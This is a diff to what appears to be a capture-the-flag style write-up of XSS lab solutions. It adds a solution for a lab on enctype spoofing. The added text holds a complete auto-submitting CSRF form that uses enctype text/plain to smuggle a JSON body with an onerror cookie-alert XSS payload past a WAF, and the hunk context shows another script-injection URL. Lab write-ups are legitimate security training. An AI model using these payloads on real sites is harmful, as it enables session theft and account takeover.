@@ -894,8 +894,28 @@ https://wtjjctrj.hacky.uk/target.ftl?name=%3Cscript+src%3D%2Fupload%2Fxss.js%250
 ---
 
 ### Lab 179: Enctype Spoofing
-- **URL Lab**: https://xssy.uk/lab/179
-- **Status**: Not solved yet
+- **URL Lab**: https://hacky.uk/lab/179
+- **Payload**: 
+```html
+<html>
+<head>
+</head>
+<body>
+    <form action="https://schlfflk.hacky.uk/target.ftl" method="POST" enctype="text/plain">
+        <input type="hidden" name='{"name":"' value='<img src=x onerror=alert(document.cookie)>"}'>
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.forms[0].submit();
+    </script>
+</body>
+</html>
+```
+- **Full URL**: 
+```
+https://eqh42jmm.hacky.uk/enctype.html
+```
+- **Description**: The core concept is param name was vulnerable POST XSS, we craft the CSRF POC with enctype=text/plain to bypass waf that strict in application/json & x-www-url-encoded
 
 ---
 
